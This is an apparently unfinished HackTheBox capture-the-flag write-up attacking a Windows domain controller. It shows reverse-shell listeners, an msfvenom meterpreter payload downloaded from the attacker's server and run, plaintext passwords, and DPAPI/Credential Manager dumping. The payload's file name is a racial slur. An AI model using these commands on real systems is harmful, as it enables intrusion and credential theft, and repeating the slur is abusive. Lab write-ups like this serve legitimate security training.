---
title: "HackTheBox DanglingTree"
date: "12 August, 2026"
description: "In Progress"
difficulty : "Medium"
opsystem : "Windows"
---

![Instant](pict link here)

# HackTheBox - DanglingTree

### Reconnaisance & Information Gathering

#### Nmap 
``` 
┌──(blackcat㉿threatactor)-[~/Desktop/danglingtree-htb]
└─$ sudo nmap -Pn -p- -A -T4 10.129.29.249                          
[sudo] password for blackcat: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-12 20:51 +0700
Nmap scan report for 10.129.29.249
Host is up (0.025s latency).
Not shown: 65510 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-12 20:53:34Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: danglingtree.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.danglingtree.htb, DNS:danglingtree.htb, DNS:DANGLINGTREE
| Not valid before: 2026-08-03T16:32:53
|_Not valid after:  2106-08-03T16:32:53
443/tcp   open  ssl/https?
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=danglingtree-DC-CA
| Not valid before: 2026-03-26T05:34:19
|_Not valid after:  2114-03-26T05:44:18
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: danglingtree.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.danglingtree.htb, DNS:danglingtree.htb, DNS:DANGLINGTREE
| Not valid before: 2026-08-03T16:32:53
|_Not valid after:  2106-08-03T16:32:53
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: danglingtree.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.danglingtree.htb, DNS:danglingtree.htb, DNS:DANGLINGTREE
| Not valid before: 2026-08-03T16:32:53
|_Not valid after:  2106-08-03T16:32:53
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: danglingtree.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.danglingtree.htb, DNS:danglingtree.htb, DNS:DANGLINGTREE
| Not valid before: 2026-08-03T16:32:53
|_Not valid after:  2106-08-03T16:32:53
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server
| ssl-cert: Subject: commonName=dc.danglingtree.htb
| Not valid before: 2026-03-25T05:48:29
|_Not valid after:  2026-09-24T05:48:29
| rdp-ntlm-info: 
|   Target_Name: DANGLINGTREE
|   NetBIOS_Domain_Name: DANGLINGTREE
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: danglingtree.htb
|   DNS_Computer_Name: dc.danglingtree.htb
|   DNS_Tree_Name: danglingtree.htb
|   Product_Version: 10.0.26100
|_  System_Time: 2026-08-12T20:55:18+00:00
|_ssl-date: TLS randomness does not represent time
6600/tcp  open  ssl/mshvlm?
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=dc.danglingtree.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.danglingtree.htb
| Not valid before: 2026-03-26T05:41:20
|_Not valid after:  2027-03-26T05:41:20
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 403 Forbidden
|     Connection: close
|     Date: Wed, 12 Aug 2026 20:53:51 GMT
|     Cache-Control: no-store
|     Cache-Control: max-age=0
|     Pragma: no-cache
|     Set-Cookie: .AspNetCore.Antiforgery.7Eyhia2WOxE=CfDJ8HsozULo80ZBsxvkNAKguok5HChgrXZtfWESOJ__OfOgevp18U7ZlppSBcJJnJQTshA57dt7qErUfJ-odfX3HjQKoVbubTH8eLxStKghdfvXS7GG9PbVx1NvgyrS_kurXiPemU3aoV2ayRH8b_E2EP4; path=/; secure; samesite=none; Partitioned
|     Set-Cookie: WAC-SESSION=8055339f98264f2e84a7f2277251dffa; expires=Thu, 13 Aug 2026 20:53:51 GMT; path=/; secure; samesite=lax; httponly
|     Set-Cookie: WAC-TOKEN=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/
|     Set-Cookie: WAC-AAD=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/
|     Set-Cookie: XSRF-TOKEN=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/
|     Strict-Transport-Security: max-age=5184000; includeSubDomains; preload
|     <!DOCTYPE html>
|     <html lang="en" xmlns="http://www.w3.org/1999/xhtml">
|     <head
|   HTTPOptions: 
|     HTTP/1.1 403 Forbidden
|     Connection: close
|     Date: Wed, 12 Aug 2026 20:53:51 GMT
|     Cache-Control: no-store
|     Cache-Control: max-age=0
|     Pragma: no-cache
|     Set-Cookie: .AspNetCore.Antiforgery.7Eyhia2WOxE=CfDJ8HsozULo80ZBsxvkNAKguoksevkNY2SN5vIiYJNVN_oghPHBIxNVqU6h_xgSue4YdjdQOftR2Zyfl69pk8j6EDTKG9KZkwDAwea8hQKjqT9Wcj9vP1CGUq_S4hZQD_eo-hnIkYsxQly7F5mOYyvs9Dg; path=/; secure; samesite=none; Partitioned
|     Set-Cookie: WAC-SESSION=ca96983c0e874f9b869d173bc9f73c11; expires=Thu, 13 Aug 2026 20:53:51 GMT; path=/; secure; samesite=lax; httponly
|     Set-Cookie: WAC-TOKEN=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/
|     Set-Cookie: WAC-AAD=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/
|     Set-Cookie: XSRF-TOKEN=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/
|     Strict-Transport-Security: max-age=5184000; includeSubDomains; preload
|     <!DOCTYPE html>
|     <html lang="en" xmlns="http://www.w3.org/1999/xhtml">
|_    <head
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
49726/tcp open  msrpc         Microsoft Windows RPC
49769/tcp open  msrpc         Microsoft Windows RPC
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3389-TCP:V=7.99%I=7%D=8/12%Time=6A7C7B00%P=x86_64-pc-linux-gnu%r(Te
SF:rminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02\
SF:0\0\0");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port6600-TCP:V=7.99%T=SSL%I=7%D=8/12%Time=6A7C7B0C%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,1000,"HTTP/1\.1\x20403\x20Forbidden\r\nConnection:\x20cl
SF:ose\r\nDate:\x20Wed,\x2012\x20Aug\x202026\x2020:53:51\x20GMT\r\nCache-C
SF:ontrol:\x20no-store\r\nCache-Control:\x20max-age=0\r\nPragma:\x20no-cac
SF:he\r\nSet-Cookie:\x20\.AspNetCore\.Antiforgery\.7Eyhia2WOxE=CfDJ8HsozUL
SF:o80ZBsxvkNAKguok5HChgrXZtfWESOJ__OfOgevp18U7ZlppSBcJJnJQTshA57dt7qErUfJ
SF:-odfX3HjQKoVbubTH8eLxStKghdfvXS7GG9PbVx1NvgyrS_kurXiPemU3aoV2ayRH8b_E2E
SF:P4;\x20path=/;\x20secure;\x20samesite=none;\x20Partitioned\r\nSet-Cooki
SF:e:\x20WAC-SESSION=8055339f98264f2e84a7f2277251dffa;\x20expires=Thu,\x20
SF:13\x20Aug\x202026\x2020:53:51\x20GMT;\x20path=/;\x20secure;\x20samesite
SF:=lax;\x20httponly\r\nSet-Cookie:\x20WAC-TOKEN=;\x20expires=Thu,\x2001\x
SF:20Jan\x201970\x2000:00:00\x20GMT;\x20path=/\r\nSet-Cookie:\x20WAC-AAD=;
SF:\x20expires=Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT;\x20path=/\r\n
SF:Set-Cookie:\x20XSRF-TOKEN=;\x20expires=Thu,\x2001\x20Jan\x201970\x2000:
SF:00:00\x20GMT;\x20path=/\r\nStrict-Transport-Security:\x20max-age=518400
SF:0;\x20includeSubDomains;\x20preload\r\n\r\n<!DOCTYPE\x20html>\r\n<html\
SF:x20lang=\"en\"\x20xmlns=\"http://www\.w3\.org/1999/xhtml\">\r\n\r\n<hea
SF:d")%r(HTTPOptions,1000,"HTTP/1\.1\x20403\x20Forbidden\r\nConnection:\x2
SF:0close\r\nDate:\x20Wed,\x2012\x20Aug\x202026\x2020:53:51\x20GMT\r\nCach
SF:e-Control:\x20no-store\r\nCache-Control:\x20max-age=0\r\nPragma:\x20no-
SF:cache\r\nSet-Cookie:\x20\.AspNetCore\.Antiforgery\.7Eyhia2WOxE=CfDJ8Hso
SF:zULo80ZBsxvkNAKguoksevkNY2SN5vIiYJNVN_oghPHBIxNVqU6h_xgSue4YdjdQOftR2Zy
SF:fl69pk8j6EDTKG9KZkwDAwea8hQKjqT9Wcj9vP1CGUq_S4hZQD_eo-hnIkYsxQly7F5mOYy
SF:vs9Dg;\x20path=/;\x20secure;\x20samesite=none;\x20Partitioned\r\nSet-Co
SF:okie:\x20WAC-SESSION=ca96983c0e874f9b869d173bc9f73c11;\x20expires=Thu,\
SF:x2013\x20Aug\x202026\x2020:53:51\x20GMT;\x20path=/;\x20secure;\x20sames
SF:ite=lax;\x20httponly\r\nSet-Cookie:\x20WAC-TOKEN=;\x20expires=Thu,\x200
SF:1\x20Jan\x201970\x2000:00:00\x20GMT;\x20path=/\r\nSet-Cookie:\x20WAC-AA
SF:D=;\x20expires=Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT;\x20path=/\
SF:r\nSet-Cookie:\x20XSRF-TOKEN=;\x20expires=Thu,\x2001\x20Jan\x201970\x20
SF:00:00:00\x20GMT;\x20path=/\r\nStrict-Transport-Security:\x20max-age=518
SF:4000;\x20includeSubDomains;\x20preload\r\n\r\n<!DOCTYPE\x20html>\r\n<ht
SF:ml\x20lang=\"en\"\x20xmlns=\"http://www\.w3\.org/1999/xhtml\">\r\n\r\n<
SF:head");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|11|2012|2016 (88%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (88%), Microsoft Windows 11 24H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m31s, deviation: 0s, median: 6h59m30s
| smb2-time: 
|   date: 2026-08-12T20:55:22
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   24.68 ms 10.10.14.1
2   25.68 ms 10.129.29.249

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 322.24 seconds
```

#### Generate Host File
```
┌──(blackcat㉿threatactor)-[~/Desktop/danglingtree-htb]
└─$ nxc smb 10.129.29.249 --generate-hosts-file hostfile
SMB         10.129.29.249   445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:danglingtree.htb) (signing:True) (SMBv1:None) (Null Auth:True)
                          
┌──(blackcat㉿threatactor)-[~/Desktop/danglingtree-htb]
└─$ cat hostfile  
10.129.29.249     DC.danglingtree.htb danglingtree.htb DC
```

#### SMB Enumeration
```
┌──(blackcat㉿threatactor)-[~/Desktop/danglingtree-htb]
└─$ nxc smb 10.129.29.249 -u 'a' -p '' --shares
SMB         10.129.29.249   445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:danglingtree.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.29.249   445    DC               [+] danglingtree.htb\a: (Guest)
SMB         10.129.29.249   445    DC               [*] Enumerated shares
SMB         10.129.29.249   445    DC               Share           Permissions            Remark
SMB         10.129.29.249   445    DC               -----           -----------            ------
SMB         10.129.29.249   445    DC               ADMIN$                                 Remote Admin
SMB         10.129.29.249   445    DC               C$                                     Default share
SMB         10.129.29.249   445    DC               IPC$            READ                   Remote IPC
SMB         10.129.29.249   445    DC               IT              READ                   
SMB         10.129.29.249   445    DC               NETLOGON                               Logon server share 
SMB         10.129.29.249   445    DC               SYSVOL                                 Logon server share 
```

```
┌──(blackcat㉿threatactor)-[~/Desktop/danglingtree-htb]
└─$ smbclient //10.129.29.249/IT             
Password for [WORKGROUP\blackcat]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Apr  5 08:05:09 2026
  ..                                  D        0  Sun Apr  5 07:57:30 2026
  Security                            D        0  Sun Apr  5 08:05:20 2026

		7062015 blocks of size 4096. 2234391 blocks available
smb: \> cd Security\
smb: \Security\> ls
  .                                   D        0  Sun Apr  5 08:05:20 2026
  ..                                  D        0  Sun Apr  5 08:05:09 2026
  DanglingTree_RoE_Assessment.pdf      A    28905  Sat Apr  4 22:50:23 2026

		7062015 blocks of size 4096. 2234383 blocks available
smb: \Security\> get DanglingTree_RoE_Assessment.pdf 
getting file \Security\DanglingTree_RoE_Assessment.pdf of size 28905 as DanglingTree_RoE_Assessment.pdf (252.0 KiloBytes/sec) (average 252.0 KiloBytes/sec)
smb: \Security\> exit
```

<img width="986" height="673" alt="image" src="https://github.com/user-attachments/assets/ec327bb7-486d-4c24-bcc9-cf4d39a80d97" />

```
┌──(blackcat㉿threatactor)-[~/Desktop/danglingtree-htb]
└─$ nxc smb 10.129.29.249 -u 'anderson.w' -p 'R3dT3am@Acc3ss#01'         
SMB         10.129.29.249   445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:danglingtree.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.29.249   445    DC               [+] danglingtree.htb\anderson.w:R3dT3am@Acc3ss#01 
```

### Foothold

#### Windows Admin Center RCE
<img width="1271" height="850" alt="image" src="https://github.com/user-attachments/assets/e5bfe800-191a-4499-9f91-a37e1a57cfbd" />
<img width="1824" height="945" alt="image" src="https://github.com/user-attachments/assets/923baea5-adbc-4218-9b22-03a27e6a1124" />
<img width="1203" height="524" alt="image" src="https://github.com/user-attachments/assets/cf678906-8949-44b1-88ce-6b39ac9912c4" />
<img width="704" height="444" alt="image" src="https://github.com/user-attachments/assets/6c069bb4-c4f5-4ab8-b9d6-3c9c0524e6ec" />
<img width="1168" height="874" alt="image" src="https://github.com/user-attachments/assets/90bc3a77-50f0-41d1-b60a-5087636d9e0b" />
<img width="1216" height="659" alt="image" src="https://github.com/user-attachments/assets/a45ce4bb-db56-4970-8fbb-d1b8df167599" />

```
┌──(blackcat㉿threatactor)-[~/Desktop/danglingtree-htb]
└─$ nc -lvnp 1337                                                                                       
listening on [any] 1337 ...
connect to [10.10.14.183] from (UNKNOWN) [10.129.10.114] 62927

PS C:\WINDOWS\system32> whoami
danglingtree\anderson.w
```

### Lateral Movement

#### Local Open Port Enumeration
```
PS C:\Windows\System32>netstat -ano | findstr LISTENING
netstat -ano | findstr LISTENING
 ...
  TCP    0.0.0.0:17017          0.0.0.0:0              LISTENING       2756
 ...
```

```
┌──(blackcat㉿threatactor)-[~/Desktop/danglingtree-htb]
└─$ python3 -m http.server 8888                   
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.129.10.114 - - [17/Aug/2026 21:49:59] "GET /agent.exe HTTP/1.1" 200 -
```

```
┌──(blackcat㉿threatactor)-[~/Desktop/danglingtree-htb]
└─$ sudo ligolo-proxy -selfcert
[sudo] password for blackcat: 
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
INFO[0000] Listening on 0.0.0.0:11601                   
INFO[0000] Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8081 
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: dev

ligolo-ng » WARN[0000] Ligolo-ng API is experimental, and should be running behind a reverse-proxy if publicly exposed. 
INFO[1169] Agent joined. id=0050569574da name="DANGLINGTREE\\anderson.w@dc" remote="10.129.10.114:62935"
INFO[1187] Starting tunnel to DANGLINGTREE\anderson.w@dc (0050569574da)
```

```
┌──(blackcat㉿threatactor)-[~/Desktop/danglingtree-htb/ligolo-ng-web]
└─$ npm run dev                                                                       

> ligolo-ng-web@0.0.0 dev
> vite

  VITE v5.4.14  ready in 1062 ms

  ➜  Local:   http://localhost:5173/
  ➜  Network: use --host to expose
  ➜  press h + enter to show help

```

```
PS C:\Users\anderson.w\Documents> Invoke-WebRequest http://10.10.14.183:8888/agent.exe -UseBasicParsing -OutFile agent.exe
PS C:\Users\anderson.w\Documents> .\agent.exe -connect 10.10.14.183:11601 -ignore-cert
```

<img width="531" height="255" alt="image" src="https://github.com/user-attachments/assets/1ce1af3c-b086-4689-8536-f1fa83789bc1" />
<img width="804" height="468" alt="image" src="https://github.com/user-attachments/assets/1f033e4a-aac3-4f73-8e7b-a8bab270a7c7" />

#### Smartermail Auth Bypass via Password Reset + RCE
<img width="1822" height="899" alt="image" src="https://github.com/user-attachments/assets/98eb6cc9-0398-4b4b-a524-4fe6f5d67078" />
https://labs.watchtowr.com/attackers-with-decompilers-strike-again-smartertools-smartermail-wt-2026-0001-auth-bypass/

```
PS C:\Users\anderson.w\Documents> ls -force /Users 
    Directory: C:\Users
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         3/25/2026  10:40 PM                .NET v4.5                                                            
d-----         3/25/2026  10:40 PM                .NET v4.5 Classic                                                    
d-----         3/25/2026  10:19 PM                Administrator                                                        
d--hsl          4/1/2024  12:26 AM                All Users                                                            
d-----         8/16/2026   2:51 PM                anderson.w                                                           
d-rh--         3/25/2026  10:16 PM                Default                                                              
d--hsl          4/1/2024  12:26 AM                Default User                                                         
d-----         3/26/2026   2:23 PM                noah.b                                                               
d-r---         8/16/2026   5:25 PM                Public                                                               
d-----         3/27/2026   5:53 PM                svc_mail                                                             
-a-hs-          4/1/2024  12:01 AM            174 desktop.ini 
```

<img width="982" height="815" alt="image" src="https://github.com/user-attachments/assets/230add9d-e470-4af0-a6cb-ebde7a702ab8" />
<img width="1213" height="658" alt="image" src="https://github.com/user-attachments/assets/c2aa5858-0042-43bf-9f02-c16f2626428c" />

<img width="1828" height="892" alt="image" src="https://github.com/user-attachments/assets/c6e0163a-496c-48ee-9bba-b1ccb07a5608" />

```
┌──(blackcat㉿threatactor)-[~/Desktop/danglingtree-htb]
└─$ penelope -p 1338
[+] Listening for reverse shells on 0.0.0.0:1338 →  127.0.0.1 • 192.168.100.24 • 192.168.100.112 • 172.17.0.1 • 10.10.14.183
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from DC~10.129.10.114-Microsoft_Windows_Server_2025_Standard-x64-based_PC 😍️ Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1], Shell Type: Basic, Menu key: Ctrl-D 
[+] Logging to /home/blackcat/.penelope/DC~10.129.10.114-Microsoft_Windows_Server_2025_Standard-x64-based_PC/2026_08_18-08_42_07-956.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

PS C:\Program Files (x86)\SmarterTools\SmarterMail\Service\Settings> whoami
danglingtree\svc_mail
```

#### SmarterMail User (noah.b) Password Decryption from Backup Folder

C:\SmarterMail\Domains\danglingtree.htb\Users\noah.b\settings.json
<img width="1817" height="747" alt="image" src="https://github.com/user-attachments/assets/f5573733-cb3b-4c06-9774-e19e246d7a04" />
<img width="576" height="567" alt="image" src="https://github.com/user-attachments/assets/651403e7-bea8-41e8-bb36-8022e8e791ff" />
<img width="1781" height="908" alt="image" src="https://github.com/user-attachments/assets/0f024571-53e5-4bec-a29f-86545f49ed6b" />

```
┌──(blackcat㉿threatactor)-[~/Desktop/danglingtree-htb]
└─$ nxc smb 10.129.10.114 -u 'noah.b' -p 'RiverDragon#Storm25'        
SMB         10.129.10.114   445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:danglingtree.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.10.114   445    DC               [+] danglingtree.htb\noah.b:RiverDragon#Storm25
```

### User Shell (noah.b) + User Flag

```
msf > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp
payload => windows/x64/meterpreter_reverse_tcp
msf exploit(multi/handler) > set lhost 10.10.14.183
lhost => 10.10.14.183
msf exploit(multi/handler) > set lport 6666
lport => 6666
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.183:6666 

```

```
┌──(blackcat㉿threatactor)-[~/Desktop/danglingtree-htb]
└─$ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.183 LPORT=6666 -f exe -o niggasuu.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 248902 bytes
Final size of exe file: 256000 bytes
Saved as: niggasuu.exe
```

https://github.com/jakobfriedl/precompiled-binaries
<img width="1821" height="891" alt="image" src="https://github.com/user-attachments/assets/3df9ffd9-732a-4dd6-82b6-b08c3fe7fd1e" />

```
PS C:\Users\Public> Invoke-WebRequest http://10.10.14.183:8888/niggasuu.exe -UseBasicParsing -OutFile niggasuu.exe
PS C:\Users\Public> Invoke-WebRequest http://10.10.14.183:8888/runascs.exe -UseBasicParsing -OutFile runascs.exe
PS C:\Users\Public> .\runascs.exe noah.b "RiverDragon#Storm25" ".\niggasuu.exe"
[*] Warning: The logon for user 'noah.b' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

```

```
[*] Meterpreter session 1 opened (10.10.14.183:6666 -> 10.129.10.114:63180) at 2026-08-17 22:08:53 +0700

meterpreter > shell
Process 468 created.
Channel 3 created.
Microsoft Windows [Version 10.0.26100.33158]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\System32>whoami
whoami
danglingtree\noah.b
C:\Windows\System32> type /Users/noah.b/Desktop/user.txt
type /Users/noah.b/Desktop/user.txt
{ User Flag Pwned! }
```

### Privesc to Administrator

#### Windows Credential Manager (alex.o creds)

https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#credentials-manager--windows-vault
<img width="1817" height="886" alt="image" src="https://github.com/user-attachments/assets/70166419-4226-4f8e-8c05-69a18af66473" />

```
C:\Windows\System32>cmdkey /list
cmdkey /list

Currently stored credentials:

    Target: Domain:target=PC01.danglingtree.htb
    Type: Domain Password
    User: alex.o
    
    Target: Domain:interactive=danglingtree\alex.o
    Type: Domain Password
    User: danglingtree\alex.o
```
```
C:\Windows\System32>runas /user:danglingtree\alex.o /savecred cmd.exe
runas /user:danglingtree\alex.o /savecred cmd.exe
Enter the password for danglingtree\alex.o: 

```

https://www.thehacker.recipes/ad/movement/credentials/dumping/windows-credential-manager
<img width="1821" height="895" alt="image" src="https://github.com/user-attachments/assets/90326b90-193c-4f81-a765-2b2af6d8305e" />

```
PS C:\ProgramData\Microsoft\Vault> vaultcmd /list
Currently loaded vaults:
	Vault: Web Credentials
	Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
	Location: C:\Users\noah.b\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

	Vault: Windows Credentials
	Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
	Location: C:\Users\noah.b\AppData\Local\Microsoft\Vault

PS C:\ProgramData\Microsoft\Vault> VaultCmd /listproperties:"Web Credentials"
Vault Properties: Web Credentials
Location: C:\Users\noah.b\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
Number of credentials: 0
Current protection method: DPAPI

PS C:\ProgramData\Microsoft\Vault> VaultCmd /listproperties:"Windows Credentials"
Vault Properties: Windows Credentials
Location: C:\Users\noah.b\AppData\Local\Microsoft\Vault
Number of credentials: 2
Current protection method: DPAPI

PS C:\ProgramData\Microsoft\Vault> cd \Users\noah.b\AppData\Local\Microsoft\Vault
PS C:\Users\noah.b\AppData\Local\Microsoft\Vault> ls

    Directory: C:\Users\noah.b\AppData\Local\Microsoft\Vault

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         3/26/2026   2:24 PM                4BF4C442-9B8A-41A0-B380-DD4A704DDB28                                 

PS C:\Users\public> VaultCmd /listcreds:"Windows Credentials"
Credentials in vault: Windows Credentials

Credential schema: Windows Domain Password Credential
Resource: Domain:target=PC01.danglingtree.htb
Identity: alex.o
Hidden: No
Roaming: No
Property (schema element id,value): (100,3)

Credential schema: Windows Domain Password Credential
Resource: Domain:interactive=danglingtree\alex.o
Identity: danglingtree\alex.o
Hidden: No
Roaming: No
Property (schema element id,value): (100,3)

```

```
PS C:\Users\Public> Invoke-WebRequest http://10.10.14.183:8888/sharphound.exe -UseBasicParsing -OutFile sharphound.exe
PS C:\Users\Public> .\SharpDPAPI.exe vaults
  __                 _   _       _ ___ 
 (_  |_   _. ._ ._  | \ |_) /\  |_) |  
 __) | | (_| |  |_) |_/ |  /--\ |  _|_ 
                |                      
  v1.11.3                               

[*] Action: User DPAPI Vault Triage
[*] Triaging Vaults for the current user
[*] Triaging Vault folder: C:\Users\noah.b\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

  VaultID            : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
  Name               : Web Credentials
    guidMasterKey    : {f53fcaba-f057-48e8-8f92-0180d274bf0f}
    size             : 324
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : 
    [X] MasterKey GUID not in cache: {f53fcaba-f057-48e8-8f92-0180d274bf0f}

SharpDPAPI completed in 00:00:00.0449771
PS C:\Users\Public> SharpDPAPI.exe credentials
PS C:\Users\Public>
(nothing ??)

PS C:\Users\Public> SharpDPAPI.exe vaults /password:"RiverDragon#Storm25"
PS C:\Users\Public> .\SharpDPAPI.exe credentials
  __                 _   _       _ ___ 
 (_  |_   _. ._ ._  | \ |_) /\  |_) |  
 __) | | (_| |  |_) |_/ |  /--\ |  _|_ 
                |                      
  v1.11.3                               

[*] Action: User DPAPI Credential Triage
[*] Triaging Credentials for current user

Folder       : C:\Users\noah.b\AppData\Roaming\Microsoft\Credentials\
  CredFile           : 57FFB67D684C67F09E7153B9C7CC3940
    guidMasterKey    : {f53fcaba-f057-48e8-8f92-0180d274bf0f}
    size             : 490
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : Enterprise Credential Data
    [X] MasterKey GUID not in cache: {f53fcaba-f057-48e8-8f92-0180d274bf0f}

  CredFile           : 669577566E0F86A3BB614E0B17AFF1B2
    guidMasterKey    : {f377b93a-115f-4f68-991b-1813a39bfc25}
    size             : 474
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : Enterprise Credential Data
    [X] MasterKey GUID not in cache: {f377b93a-115f-4f68-991b-1813a39bfc25}

SharpDPAPI completed in 00:00:00.0117994

PS C:\Users\Public> .\SharpDPAPI.exe vaults /password:"RiverDragon#Storm25"
  __                 _   _       _ ___ 
 (_  |_   _. ._ ._  | \ |_) /\  |_) |  
 __) | | (_| |  |_) |_/ |  /--\ |  _|_ 
                |                      
  v1.11.3                               

[*] Action: User DPAPI Vault Triage
[*] Will decrypt user masterkeys with password: RiverDragon#Storm25
[*] Found MasterKey : C:\Users\noah.b\AppData\Roaming\Microsoft\Protect\S-1-5-21-4220238332-57023728-1129110646-1602\f377b93a-115f-4f68-991b-1813a39bfc25
